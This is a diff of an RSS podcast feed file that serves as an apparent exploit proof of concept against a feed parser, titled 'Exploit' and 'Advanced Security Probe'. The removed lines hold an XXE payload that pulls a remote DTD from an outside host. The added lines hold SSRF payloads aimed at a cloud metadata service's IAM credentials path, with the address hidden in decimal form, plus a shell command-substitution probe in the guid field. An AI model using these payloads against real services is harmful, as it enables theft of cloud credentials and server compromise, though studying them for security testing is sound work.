@@ -1,6 +1,12 @@
 <?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE r [
-  <!ENTITY % remote SYSTEM "https://nbvvcghvhjjkgh.github.io/applle-poc/xxe.dtd">
-  %remote;
-]>
-<rss version="2.0"><channel><title>Exploit</title></channel></rss>
+<rss version="2.0" xmlns:itunes="http://www.itunes.com/dtds/podcast-1.0.dtd">
+  <channel>
+    <title>Advanced Security Probe</title>
+    <item>
+      <title>Exploit v3</title>
+      <enclosure url="http://2852039166/latest/meta-data/iam/security-credentials/" length="1024" type="audio/mpeg" />
+      <itunes:image href="http://2852039166/latest/meta-data/iam/security-credentials/" />
+      <guid>probe-$(date +%s)</guid>
+    </item>
+  </channel>
+</rss>
